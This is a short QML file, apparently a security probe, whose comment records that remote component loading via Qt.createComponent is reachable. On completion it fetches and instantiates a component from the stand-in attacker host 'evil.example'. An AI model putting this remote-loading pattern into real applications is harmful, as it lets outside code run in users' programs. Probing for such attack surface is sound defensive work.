import QtQuick

Item {
    // R-1: remote component creation. H0 probe B 2026-08-27: the call enters
    // Component.Loading and reaches Component.Ready with a working instance,
    // so remote loading through Qt.createComponent is REACHABLE.
    Component.onCompleted: {
        var component = Qt.createComponent("https://evil.example/W.qml")
        component.createObject(root)
    }
}
